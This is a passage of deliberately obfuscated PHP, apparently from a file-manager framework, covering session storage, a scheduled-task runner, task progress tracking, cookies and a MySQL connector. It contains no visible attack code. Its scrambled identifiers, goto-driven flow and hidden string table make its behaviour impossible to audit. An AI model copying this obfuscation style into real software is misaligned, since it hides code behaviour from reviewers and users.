$Bã–”„³Ó’[$c§øî±ò‹Â[1391]]; $E…•Ø†ƒ… = $Bã–”„³Ó’[$dÜ›­íÊ¾]; $aï†ãø´à = $Bã–”„³Ó’[$c§øî±ò‹Â[752]]; goto F‹äâç£‘ë; F‹äâç£‘ë: switch ($dÜ›­íÊ¾) { case $c§øî±ò‹Â[17]: self::$handle = Model($c§øî±ò‹Â[753]); break; case $c§øî±ò‹Â[754]: self::$handle = new CacheRedis($E…•Ø†ƒ…, $aï†ãø´à); break; case $c§øî±ò‹Â[755]: self::$handle = new CacheMemcached($E…•Ø†ƒ…, $aï†ãø´à); break; case $c§øî±ò‹Â[167]: $E…•Ø†ƒ…[$c§øî±ò‹Â[75]] = $E…•Ø†ƒ…[$c§øî±ò‹Â[75]] . $c§øî±ò‹Â[1392]; self::$handle = new CacheFile($E…•Ø†ƒ…, $aï†ãø´à); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $BÎê³ˆ–øç = new self(); goto dœá‘¶ÍÇ; díÈ‹ÁÏÍ„: $d¨Î¨Éîî = _get($GLOBALS, $c§øî±ò‹Â[1390], $d¨Î¨Éîî); if (self::$sessionSign) { } else { if (Cookie::get($d¨Î¨Éîî)) { self::$sessionSign = Cookie::get($d¨Î¨Éîî); } else { self::$sessionSign = guid(); } } Cookie::setSafe($d¨Î¨Éîî, self::$sessionSign, self::$sessionTime); goto Dæ®•ÇÏ¯±; c¨èÁÃÛ»©: $c§øî±ò‹Â =& $_SERVER[Î¿—”òá]; static $BÎê³ˆ–øç = false; if ($BÎê³ˆ–øç) { return $BÎê³ˆ–øç; } goto C×ñ’¹Äö‘; C×ñ’¹Äö‘: $Bã–”„³Ó’ = $GLOBALS[$c§øî±ò‹Â[6]][$c§øî±ò‹Â[337]]; self::$sessionTime = $Bã–”„³Ó’[$c§øî±ò‹Â[1389]]; $d¨Î¨Éîî = SESSION_ID; goto díÈ‹ÁÏÍ„; D¬ŠÒ…òíŞ: } public static function sign($AË¾ÜÆĞ¤  = false) { $AË¾ÜÆĞ¤  && (self::$sessionSign = $AË¾ÜÆĞ¤ ); self::init(); return self::$sessionSign; } public static function set($dªµÇ¿œòª, $D¹êÕŠ•Â’ = false) { self::init(); if (is_array($dªµÇ¿œòª)) { foreach ($dªµÇ¿œòª as $F†Ïˆ·¸ìÈ => $a‹ï­©ŒÌ´) { array_set_value(self::$data, $F†Ïˆ·¸ìÈ, $a‹ï­©ŒÌ´); } } else { array_set_value(self::$data, $dªµÇ¿œòª, $D¹êÕŠ•Â’); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($EŒç×ÇùÕ® = false) { self::init(); if (!$EŒç×ÇùÕ®) { return self::$data; } return array_get_value(self::$data, $EŒç×ÇùÕ®); } public static function remove($FÀ½ø…¤) { self::init(); unset(self::$data[$FÀ½ø…¤]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Î¿—”òá][757])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto d²«Û×†«; d²«Û×†«: $dÇÓÇİƒÑ =& $_SERVER[Î¿—”òá]; if (self::valueGet($dÇÓÇİƒÑ[685]) != $dÇÓÇİƒÑ[83]) { return; } if (self::valueGet($dÇÓÇİƒÑ[1393]) == $dÇÓÇİƒÑ[83]) { $BŒ–ª®µÜ± = self::valueGet($dÇÓÇİƒÑ[1394]); if (time() - $BŒ–ª®µÜ± > 3600 * 2) { self::restart(); } return; } goto c‡–›ºÂ¦°; c‡–›ºÂ¦°: http_close(); self::valueSet($dÇÓÇİƒÑ[1393], $dÇÓÇİƒÑ[83]); Hook::bind($dÇÓÇİƒÑ[1395], $dÇÓÇİƒÑ[1396]); goto F†ò‚Â®Ä; F†ò‚Â®Ä: while (!0) { self::cacheClear(); if (self::valueGet($dÇÓÇİƒÑ[685]) != $dÇÓÇİƒÑ[83]) { self::valueSet($dÇÓÇİƒÑ[1393], $dÇÓÇİƒÑ[468]); self::log($dÇÓÇİƒÑ[1397]); die; } self::valueSet($dÇÓÇİƒÑ[1393], $dÇÓÇİƒÑ[83]); self::valueSet($dÇÓÇİƒÑ[1394], time()); self::taskRunAll(); sleep(self::valueGet($dÇÓÇİƒÑ[1398])); } goto aã¸å›¨†“; aã¸å›¨†“: } public static function restart() { $Có—ÍÅĞåø =& $_SERVER[Î¿—”òá]; http_close(); self::valueSet($Có—ÍÅĞåø[685], $Có—ÍÅĞåø[468]); sleep(self::valueGet($Có—ÍÅĞåø[1398]) + 5); self::valueSet($Có—ÍÅĞåø[1393], $Có—ÍÅĞåø[468]); self::valueSet($Có—ÍÅĞåø[685], $Có—ÍÅĞåø[83]); } public static function shutdownEvent() { $AÌÆÈ…éˆ =& $_SERVER[Î¿—”òá]; self::valueSet($AÌÆÈ…éˆ[1393], $AÌÆÈ…éˆ[468]); self::log($AÌÆÈ…éˆ[1399]); } public static function config($dÎ×†¢»¸, $Eõ¤ğÀñ´) { $b§”óñšëÓ =& $_SERVER[Î¿—”òá]; $AÙíöÜ‰šñ = 20; $Eõ¤ğÀñ´ = intval($Eõ¤ğÀñ´) <= $AÙíöÜ‰šñ ? $AÙíöÜ‰šñ : intval($Eõ¤ğÀñ´); self::valueSet($b§”óñšëÓ[685], $dÎ×†¢»¸); self::valueSet($b§”óñšëÓ[1398], $Eõ¤ğÀñ´); } private static function taskRunAll() { $e¢…ñøô±Ô =& $_SERVER[Î¿—”òá]; $FÎÖ‹›¦ô = Model($e¢…ñøô±Ô[1400])->listData(); $d©…¹æ§Ç¼ = count($FÎÖ‹›¦ô); for ($FïÇ§³ÓÎ¥ = 0; $FïÇ§³ÓÎ¥ < $d©…¹æ§Ç¼; $FïÇ§³ÓÎ¥++) { $D–éˆ¬Ğ = $FÎÖ‹›¦ô[$FïÇ§³ÓÎ¥]; if ($D–éˆ¬Ğ[$e¢…ñøô±Ô[1401]] != $e¢…ñøô±Ô[83]) { continue; } if (!self::taskTimeCheck($D–éˆ¬Ğ)) { continue; } self::taskRun($D–éˆ¬Ğ); } Hook::trigger($e¢…ñøô±Ô[1402]); } private static function taskTimeCheck($D“¯İ¸¦Š) { goto d‚Ç“İÄ¤ø; d‚Ç“İÄ¤ø: $f§ÎÎÛ’¶Í =& $_SERVER[Î¿—”òá]; $Aª“Ë¨¬ã­ = json_decode($D“¯İ¸¦Š[$f§ÎÎÛ’¶Í[190]], !0); $c×ëÚ‰«® = intval($D“¯İ¸¦Š[$f§ÎÎÛ’¶Í[1394]]); goto Aœ»ˆùĞ„; aïå×¢İ‰: switch ($Aª“Ë¨¬ã­[$f§ÎÎÛ’¶Í[29]]) { case $f§ÎÎÛ’¶Í[1409]: if (time() - $c×ëÚ‰«® < 3600 * 24 * 30) { return !1; } if ($Aª“Ë¨¬ã­[$f§ÎÎÛ’¶Í[1409]] == date($f§ÎÎÛ’¶Í[1410]) && $D™•Íãš‡) { return !0; } break; case $f§ÎÎÛ’¶Í[1411]: if (time() - $c×ëÚ‰«® < 3600 * 24 * 7) { return !1; } $B²‚×ñÇ¨ˆ = date($f§ÎÎÛ’¶Í[1412]) == 0 ? 7 : date($f§ÎÎÛ’¶Í[1412]); if ($Aª“Ë¨¬ã­[$f§ÎÎÛ’¶Í[1411]] == $B²‚×ñÇ¨ˆ && $D™•Íãš‡) { return !0; } break; case $f§ÎÎÛ’¶Í[1404]: if (time() - $c×ëÚ‰«® < 3600 * 24) { return !1; } if ($D™•Íãš‡) { return !0; } break; case $f§ÎÎÛ’¶Í[1413]: if (time() - $c×ëÚ‰«® >= floatval($Aª“Ë¨¬ã­[$f§ÎÎÛ’¶Í[1413]]) * 60) { return !0; } break; default: break; } return !1; goto bï¹Ö­Ô¥è; Aœ»ˆùĞ„: $A¨ëô§æ¶– = strtotime($f§ÎÎÛ’¶Í[1403] . $Aª“Ë¨¬ã­[$f§ÎÎÛ’¶Í[1404]] . $f§ÎÎÛ’¶Í[1405]) - strtotime($f§ÎÎÛ’¶Í[1406]); $BÚôÙÅÊÂ = time() - strtotime(date($f§ÎÎÛ’¶Í[1407]) . $f§ÎÎÛ’¶Í[1408]); $D™•Íãš‡ = $BÚôÙÅÊÂ >= $A¨ëô§æ¶– && $BÚôÙÅÊÂ <= $A¨ëô§æ¶– + 3600; goto aïå×¢İ‰; bï¹Ö­Ô¥è: } public static function taskRun($eÃôô¼‚ò¢) { goto d°¡„½×Ûñ; d°¡„½×Ûñ: $D¹´©í˜ô» =& $_SERVER[Î¿—”òá]; self::log($D¹´©í˜ô»[1414] . $eÃôô¼‚ò¢[$D¹´©í˜ô»[367]] . $D¹´©í˜ô»[1415] . $eÃôô¼‚ò¢[$D¹´©í˜ô»[28]] . $D¹´©í˜ô»[1416] . $eÃôô¼‚ò¢[$D¹´©í˜ô»[1417]]); Model($D¹´©í˜ô»[1400])->run($eÃôô¼‚ò¢[$D¹´©í˜ô»[367]]); goto AŞÒİù›·; FÁŒ–æòÀã: Model($D¹´©í˜ô»[1418])->add(array($D¹´©í˜ô»[1419] => $D¹´©í˜ô»[33], $D¹´©í˜ô»[1420] => $D¹´©í˜ô»[468], $D¹´©í˜ô»[29] => $D¹´©í˜ô»[1421] . $eÃôô¼‚ò¢[$D¹´©í˜ô»[367]], $D¹´©í˜ô»[1422] => json_encode(array($D¹´©í˜ô»[28] => $eÃôô¼‚ò¢[$D¹´©í˜ô»[28]], $D¹´©í˜ô»[1423] => timeFloat() - $Bôì¿«¨Ñó, $D¹´©í˜ô»[281] => $dÇŠŞ¤ïÛ™)))); self::log($D¹´©í˜ô»[1424] . $eÃôô¼‚ò¢[$D¹´©í˜ô»[367]] . $D¹´©í˜ô»[1425] . $dÇŠŞ¤ïÛ™); return !0; goto aÕ¥Ê“³±Ñ; AŞÒİù›·: $Bôì¿«¨Ñó = timeFloat(); $dÇŠŞ¤ïÛ™ = $D¹´©í˜ô»[33]; switch ($eÃôô¼‚ò¢[$D¹´©í˜ô»[29]]) { case $D¹´©í˜ô»[295]: $bŸí¾´œ‘ = url_request($eÃôô¼‚ò¢[$D¹´©í˜ô»[1417]], $D¹´©í˜ô»[216], !1, !1, !1, !1, 5); $dÇŠŞ¤ïÛ™ = strlen($bŸí¾´œ‘); break; case $D¹´©í˜ô»[215]: $dÇŠŞ¤ïÛ™ = Hook::apply($eÃôô¼‚ò¢[$D¹´©í˜ô»[1417]]); default: break; } goto FÁŒ–æòÀã; aÕ¥Ê“³±Ñ: } private static function valueGet($eŸè³³À‚Ø) { $b†‹—óñŒ =& $_SERVER[Î¿—”òá]; $b‹‡–„¶© = $b†‹—óñŒ[1426]; $d†“‰ò‚Ñ‹ = Model($b†‹—óñŒ[1427])->get($eŸè³³À‚Ø, $b‹‡–„¶©); if (is_null($d†“‰ò‚Ñ‹)) { Model($b†‹—óñŒ[1427])->set($b†‹—óñŒ[1398], 10, $b‹‡–„¶©); Model($b†‹—óñŒ[1427])->set($b†‹—óñŒ[685], $b†‹—óñŒ[83], $b‹‡–„¶©); Model($b†‹—óñŒ[1427])->set($b†‹—óñŒ[1393], $b†‹—óñŒ[468], $b‹‡–„¶©); $d†“‰ò‚Ñ‹ = Model($b†‹—óñŒ[1427])->get($eŸè³³À‚Ø, $b‹‡–„¶©); } return $d†“‰ò‚Ñ‹; } private static function valueSet($D™õ¾É²è, $dÔ‰ßøæ‚÷) { $B–âğ›§„› =& $_SERVER[Î¿—”òá]; return Model($B–âğ›§„›[1427])->set($D™õ¾É²è, $dÔ‰ßøæ‚÷, $B–âğ›§„›[1426]); } protected static function log($b°ØÏŒáİ) { write_log($b°ØÏŒáİ, $_SERVER[Î¿—”òá][1428]); } private static function cacheClear() { $B™öåÅƒâÆ =& $_SERVER[Î¿—”òá]; $A¶¾Ï©Õœ = Model($B™öåÅƒâÆ[1427])->cacheKey($B™öåÅƒâÆ[1426]); Cache::clearMemory($A¶¾Ï©Õœ); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\156\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($cÄ§Æ†¤Õ, $a„ºææ™ŠË = '', $DÆ²èò…ø¬ = 0, $CÏ‘­¬ÕÚ® = '') { goto Bá Şì¬´¹; fÁÅ¬õ½ùñ: Hook::bind($bèÃˆ“‹Ì×[1395], array($this, $bèÃˆ“‹Ì×[1437])); Hook::bind($bèÃˆ“‹Ì×[1438], array($this, $bèÃˆ“‹Ì×[1439])); $this->startAfter(); goto EìÀ¼İÈˆ“; EìÀ¼İÈˆ“: Hook::trigger($bèÃˆ“‹Ì×[1440], $this->task); $this->task[$bèÃˆ“‹Ì×[1434]] = timeFloat(); goto c‘–µÇ§îÊ; Bá Şì¬´¹: $bèÃˆ“‹Ì× =& $_SERVER[Î¿—”òá]; if (self::get($cÄ§Æ†¤Õ)) { return; } $this->task = array($bèÃˆ“‹Ì×[367] => $cÄ§Æ†¤Õ, $bèÃˆ“‹Ì×[1429] => USER_ID, $bèÃˆ“‹Ì×[1335] => $CÏ‘­¬ÕÚ®, $bèÃˆ“‹Ì×[29] => $a„ºææ™ŠË, $bèÃˆ“‹Ì×[971] => $bèÃˆ“‹Ì×[33], $bèÃˆ“‹Ì×[969] => $DÆ²èò…ø¬, $bèÃˆ“‹Ì×[983] => 0, $bèÃˆ“‹Ì×[1430] => 0, $bèÃˆ“‹Ì×[1431] => 0, $bèÃˆ“‹Ì×[1432] => timeFloat(), $bèÃˆ“‹Ì×[1433] => 0, $bèÃˆ“‹Ì×[1434] => 0, $bèÃˆ“‹Ì×[1435] => 0, $bèÃˆ“‹Ì×[1436] => 0, $bèÃˆ“‹Ì×[685] => $bèÃˆ“‹Ì×[1393]); goto fÁÅ¬õ½ùñ; c‘–µÇ§îÊ: } public function end() { goto dëÌÎòî‹É; CçòÏ»ß“Ğ: Hook::unbind($C×ŞíšÛÍĞ[1438], array($this, $C×ŞíšÛÍĞ[1439])); $this->endAfter(); $this->task = !1; goto c¨á õœ‰™; E»¦…áô…: $A„Šå¯Å = timeFloat() - $this->task[$C×ŞíšÛÍĞ[1432]]; self::log($C×ŞíšÛÍĞ[1441] . $this->task[$C×ŞíšÛÍĞ[367]] . $C×ŞíšÛÍĞ[1442] . $A„Šå¯Å . $C×ŞíšÛÍĞ[1443]); Hook::unbind($C×ŞíšÛÍĞ[1395], array($this, $C×ŞíšÛÍĞ[1437])); goto CçòÏ»ß“Ğ; dëÌÎòî‹É: $C×ŞíšÛÍĞ =& $_SERVER[Î¿—”òá]; if (!$this->task) { return; } if ($this->task[$C×ŞíšÛÍĞ[1434]]) { self::valueSet($this->task[$C×ŞíšÛÍĞ[367]], !1); } goto E»¦…áô…; c¨á õœ‰™: } public function update($F†¦êÌÜ× = 0) { goto fƒ¢áçŠ¯; eæÎ×Í†: $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[983]] += $F†¦êÌÜ×; $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1433]] = timeFloat(); if ($B¸‹•—Ü’Ù[$A™ÛÔÏ©•[969]]) { if ($B¸‹•—Ü’Ù[$A™ÛÔÏ©•[969]] < $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[983]]) { $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[969]] = $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[983]]; } $C‚˜ÌŒ•ñö = timeFloat() - $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1432]] - $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1435]]; $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1430]] = $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[983]] / $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[969]]; $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1431]] = $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[983]] / $C‚˜ÌŒ•ñö; if ($B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1430]] > 0) { $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1436]] = $C‚˜ÌŒ•ñö * (1 - $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1430]]) / $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1430]]; } $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1436]] = $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1436]] <= 0 ? 0 : $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1436]]; } goto eÔª‚«–Õ; eÔª‚«–Õ: $this->updateAfter(); $aÎé–¢øÁÆ = 0.2; if (timeFloat() - $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1434]] < $aÎé–¢øÁÆ) { return; } goto a¿ˆÌ ĞğÃ; fî»áƒò„: $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[685]] = $f íêšÒ›Ó ? $f íêšÒ›Ó : $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[685]]; $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1435]] = $dí£¸”î„[$A™ÛÔÏ©•[1435]] ? $dí£¸”î„[$A™ÛÔÏ©•[1435]] : 0; $B¸‹•—Ü’Ù[$A™ÛÔÏ©•[1434]] = timeFloat(); goto Eó­¬ÙƒÈ£; fƒ¢áçŠ¯: $A™ÛÔÏ©• =& $_SERVER[Î¿—”òá]; $B¸‹•—Ü’Ù =& $this->task; if (!$B¸‹•—Ü’Ù) { return; } goto eæÎ×Í†; a¿ˆÌ ĞğÃ: $dí£¸”î„ = self::get($B¸‹•—Ü’Ù[$A™ÛÔÏ©•[367]]); $f íêšÒ›Ó = $dí£¸”î„[$A™ÛÔÏ©•[685]]; if ($f íêšÒ›Ó == self::STATYS_KILL) { $DÃèè´ê¸¾ = array($A™ÛÔÏ©•[1444] => LNG($A™ÛÔÏ©•[1445]), $A™ÛÔÏ©•[1025] => !1); Cache::set($A™ÛÔÏ©•[1446] . $this->task[$A™ÛÔÏ©•[367]], $DÃèè´ê¸¾, 30); $this->end(); die; } else { if ($f íêšÒ›Ó == self::STATYS_STOP) { $Dšî£Æç¹ƒ = 2; $dí£¸”î„[$A™ÛÔÏ©•[1435]] += $Dšî£Æç¹ƒ; self::valueSet($B¸‹•—Ü’Ù[$A™ÛÔÏ©•[367]], $dí£¸”î„); sleep($Dšî£Æç¹ƒ); $this->update(); return; } } goto fî»áƒò„; Eó­¬ÙƒÈ£: Hook::trigger($A™ÛÔÏ©•[1447], $B¸‹•—Ü’Ù); self::valueSet($B¸‹•—Ü’Ù[$A™ÛÔÏ©•[367]], $B¸‹•—Ü’Ù); goto Bñö‰ƒˆÙ”; Bñö‰ƒˆÙ”: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($a‰Œ­ğ°…) { $DÅÌç×Œ‹ñ =& $_SERVER[Î¿—”òá]; Cache::set($DÅÌç×Œ‹ñ[1446] . $this->task[$DÅÌç×Œ‹ñ[367]], $a‰Œ­ğ°…, 60); return $a‰Œ­ğ°…; } public static function get($bÕ‡Ç±ÑÕ) { return self::valueGet($bÕ‡Ç±ÑÕ); } public static function listData() { $DŠïä¼ºÒØ = self::valueGet(); return array_sort_by($DŠïä¼ºÒØ, $_SERVER[Î¿—”òá][1432], !0); } public static function kill($EËËÎäšë) { return self::changeStatus($EËËÎäšë, self::STATYS_KILL); } public static function stop($DÏ¾İåøßÍ) { return self::changeStatus($DÏ¾İåøßÍ, self::STATYS_STOP); } public static function restart($cõ”´İÂß) { return self::changeStatus($cõ”´İÂß, self::STATYS_RUNNING); } public static function killAll() { $D«ƒ¨£Ü·Ù =& $_SERVER[Î¿—”òá]; $dË’ô«îÀ = self::listData(); foreach ($dË’ô«îÀ as $Aôò‘Ëİé·) { self::kill($Aôò‘Ëİé·[$D«ƒ¨£Ü·Ù[367]]); } sleep(2); foreach ($dË’ô«îÀ as $Aôò‘Ëİé·) { self::valueSet($Aôò‘Ëİé·[$D«ƒ¨£Ü·Ù[367]], !1); } } private static function changeStatus($CÉ™Ãˆ¸Œ, $Fó·‘Ë…ó¨) { goto fÃ®‚‘¡ƒä; fÃ®‚‘¡ƒä: $a„ğ•‰× =& $_SERVER[Î¿—”òá]; $cİ¡Ãƒ™Ú’ = self::valueGet($CÉ™Ãˆ¸Œ); if (!$cİ¡Ãƒ™Ú’) { return !1; } goto a‡¥˜ò«ğ•; a‡¥˜ò«ğ•: $cİ¡Ãƒ™Ú’[$a„ğ•‰×[685]] = $Fó·‘Ë…ó¨; self::valueSet($CÉ™Ãˆ¸Œ, $cİ¡Ãƒ™Ú’); self::log($a„ğ•‰×[1448] . $cİ¡Ãƒ™Ú’[$a„ğ•‰×[367]] . $a„ğ•‰×[1449] . $Fó·‘Ë…ó¨); goto Fé­ñ¤²ˆ“; Fé­ñ¤²ˆ“: return !0; goto côœ¦Û°¶ù; côœ¦Û°¶ù: } public static function valueGet($D³¿ÚŒÆË† = false) { $a²ê°×Åø =& $_SERVER[Î¿—”òá]; if ($D³¿ÚŒÆË†) { $b²î¬ØÒ²Û = Model($a²ê°×Åø[399])->where(array($a²ê°×Åø[89] => $D³¿ÚŒÆË†, $a²ê°×Åø[29] => $a²ê°×Åø[1450]))->find(); return $b²î¬ØÒ²Û ? json_decode($b²î¬ØÒ²Û[$a²ê°×Åø[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($c…¾°íÓ½Ö = false) { goto aŠïóÛ¼ŞÄ; aŠïóÛ¼ŞÄ: $F‚òë²ƒ =& $_SERVER[Î¿—”òá]; $C„‡ÚÙ™…Ó = array($F‚òë²ƒ[29] => $F‚òë²ƒ[1450]); if ($c…¾°íÓ½Ö) { $C„‡ÚÙ™…Ó[$F‚òë²ƒ[1429]] = $c…¾°íÓ½Ö; } goto dÈ÷äÓÁëå; BÜâìÏó”: return $bòå“¤ŞßÕ; goto dôò½ˆğâã; dÈ÷äÓÁëå: $bòå“¤ŞßÕ = Model($F‚òë²ƒ[399])->where($C„‡ÚÙ™…Ó)->select(); $bòå“¤ŞßÕ = $bòå“¤ŞßÕ ? $bòå“¤ŞßÕ : array(); foreach ($bòå“¤ŞßÕ as $c³‡Ê™äí¥ => $Aâ•¨ğ†èö) { $bòå“¤ŞßÕ[$c³‡Ê™äí¥] = json_decode($Aâ•¨ğ†èö[$F‚òë²ƒ[359]], !0); } goto BÜâìÏó”; dôò½ˆğâã: } public static function valueSet($f—•±Í²¼Ì, $C‚¿§‚±») { goto D’ ÖìÑå; f …ä¬«¢: if (!$dš˜×…‚ã‡) { ob_start(); var_dump($C‚¿§‚±»); $CíÛ³ŞÃ†¬ = ob_get_clean(); self::log($A©¿ßğÍö[1451] . json_encode_force($CíÛ³ŞÃ†¬)); } if (!$f—•±Í²¼Ì || !$C‚¿§‚±»[$A©¿ßğÍö[367]]) { return !1; } $AÛ‡ªƒŠ‰ = array($A©¿ßğÍö[29] => $A©¿ßğÍö[1450], $A©¿ßğÍö[1429] => USER_ID, $A©¿ßğÍö[89] => $f—•±Í²¼Ì, $A©¿ßğÍö[359] => $dš˜×…‚ã‡); goto D¢Ÿ‚ÁĞò; D’ ÖìÑå: $A©¿ßğÍö =& $_SERVER[Î¿—”òá]; if (!$C‚¿§‚±») { return Model($A©¿ßğÍö[399])->where(array($A©¿ßğÍö[89] => $f—•±Í²¼Ì, $A©¿ßğÍö[29] => $A©¿ßğÍö[1450]))->delete(); } $dš˜×…‚ã‡ = json_encode($C‚¿§‚±»); goto f …ä¬«¢; D¢Ÿ‚ÁĞò: Model($A©¿ßğÍö[399])->add($AÛ‡ªƒŠ‰, array(), !0); goto D‘íÔìí–Ë; D‘íÔìí–Ë: } public static function log($A‹š¡è†àØ) { write_log($A‹š¡è†àØ, $_SERVER[Î¿—”òá][1452]); } } goto c‡ôŠğ¸ò‘; Bç›Û÷¼øÒ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($dÑ”ˆç’Œ = '', $d…á÷‰¢š = 0) { if (is_string($dÑ”ˆç’Œ) && $dÑ”ˆç’Œ != $_SERVER[Î¿—”òá][33]) { $this->prefix = $dÑ”ˆç’Œ; } if (is_numeric($d…á÷‰¢š) && $d…á÷‰¢š > 0) { $this->expire = $d…á÷‰¢š; } } public static function getInstance() { static $d§¦ÉœØŸ™; if ($d§¦ÉœØŸ™ === null) { $d§¦ÉœØŸ™ = new self(); } return $d§¦ÉœØŸ™; } private static $sameCookieSet = array(); public static function set($d†œ‘¨Ìˆ§, $aŸì‚ÛÔ‚, $F®¹Ä®—Æ˜ = 0, $AÂ¢¾¨†‚à = false, $EÙë­±š¶ = false) { goto a‘ÌÒ¿óæÎ; a‘ÌÒ¿óæÎ: $eîÛ†„ó†é =& $_SERVER[Î¿—”òá]; if (!$F®¹Ä®—Æ˜) { $F®¹Ä®—Æ˜ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$d†œ‘¨Ìˆ§]) && self::$sameCookieSet[$d†œ‘¨Ìˆ§] == $aŸì‚ÛÔ‚ . $F®¹Ä®—Æ˜) { return; } goto C¤Æ¬É„£; d›Áö¡Î¶ï: setcookie($d†œ‘¨Ìˆ§, $aŸì‚ÛÔ‚, time() + $F®¹Ä®—Æ˜, $eîÛ†„ó†é[8] . trim($EÙë­±š¶, $eîÛ†„ó†é[8]) . $f‚Ô¨ªÈ»Ú, !1, !1, $AÂ¢¾¨†‚à); goto D‘ÙÂ…ƒë; C¤Æ¬É„£: self::$sameCookieSet[$d†œ‘¨Ìˆ§] = $aŸì‚ÛÔ‚ . $F®¹Ä®—Æ˜; if (!$EÙë­±š¶) { $EÙë­±š¶ = str_replace(HOST, $eîÛ†„ó†é[33], APP_HOST); $EÙë­±š¶ = _get($GLOBALS, $eîÛ†„ó†é[790], $EÙë­±š¶); } $f‚Ô¨ªÈ»Ú = $eîÛ†„ó†é[33]; goto d›Áö¡Î¶ï; D‘ÙÂ…ƒë: } public static function setSafe($BÇ¨Ïïø’Ì, $F“§Ô‰¡É, $DâËé¡£Æ = 0) { self::set($BÇ¨Ïïø’Ì, $F“§Ô‰¡É, $DâËé¡£Æ, !0); } public static function get($A…‡À…™®Ú) { return isset($_COOKIE[$A…‡À…™®Ú]) ? $_COOKIE[$A…‡À…™®Ú] : !1; } public static function remove($Dš‘»ˆ’Åé, $FÕÂÙé„Ä = false) { unset($_COOKIE[$Dš‘»ˆ’Åé]); self::set($Dš‘»ˆ’Åé, $_SERVER[Î¿—”òá][33], 1, $FÕÂÙé„Ä); } } class DbMysql extends Db { public function __construct($cŞÏÀ«îÓ = '') { $E‘ÂÜØŒğö =& $_SERVER[Î¿—”òá]; if (!extension_loaded($E‘ÂÜØŒğö[724])) { think_exception(think_lang($E‘ÂÜØŒğö[10]) . $E‘ÂÜØŒğö[791]); } if (!empty($cŞÏÀ«îÓ)) { $this->config = $cŞÏÀ«îÓ; if (empty($this->config[$E‘ÂÜØŒğö[13]])) { $this->config[$E‘ÂÜØŒğö[13]] = $E‘ÂÜØŒğö[33]; } } } public function connect($fÓ‹¼Ü„êÇ = '', $aÌ™ÇŒ†¦ = 0, $E«õÊßÖĞ˜ = false) { $cÇ‹¨Ì¨Ã˜ =& $_SERVER[Î¿—”òá]; if (!isset($this->linkID[$aÌ™ÇŒ†¦])) { goto B–â£ƒ½ÄŒ; CÏç™ÄÉß³: mysql_query($cÇ‹¨Ì¨Ã˜[796] . think_config($cÇ‹¨Ì¨Ã˜[797]) . $cÇ‹¨Ì¨Ã˜[55], $this->linkID[$aÌ™ÇŒ†¦]); if ($Cš¯ÓâÄ‘Û > $cÇ‹¨Ì¨Ã˜[798]) { mysql_query($cÇ‹¨Ì¨Ã˜[799], $this->linkID[$aÌ™ÇŒ†¦]); } $this->connected = !0; goto D¿‰ã¾Ì÷; D¿‰ã¾Ì÷: if (1 != think_config($cÇ‹¨Ì¨Ã˜[18])) { unset($this->config); } goto FÀæ‹ÍÜÉÛ; FÊœ‡øí‘ë: if ($EÊÔ¥¬¬¿é) { $this->linkID[$aÌ™ÇŒ†¦] = mysql_pconnect($a™„Û²ø–¸, $fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[794]], $fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[795]], 131072); } else { $this->linkID[$aÌ™ÇŒ†¦] = mysql_connect($a™„Û²ø–¸, $fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[794]], $fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[795]], !0, 131072); } if (!$this->linkID[$aÌ™ÇŒ†¦] || !empty($fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[17]]) && !mysql_select_db($fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[17]], $this->linkID[$aÌ™ÇŒ†¦])) { think_exception(mysql_error()); } $Cš¯ÓâÄ‘Û = mysql_get_server_info($this->linkID[$aÌ™ÇŒ†¦]); goto CÏç™ÄÉß³; B–â£ƒ½ÄŒ: if (empty($fÓ‹¼Ü„êÇ)) { $fÓ‹¼Ü„êÇ = $this->config; } $a™„Û²ø–¸ = $fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[792]] . 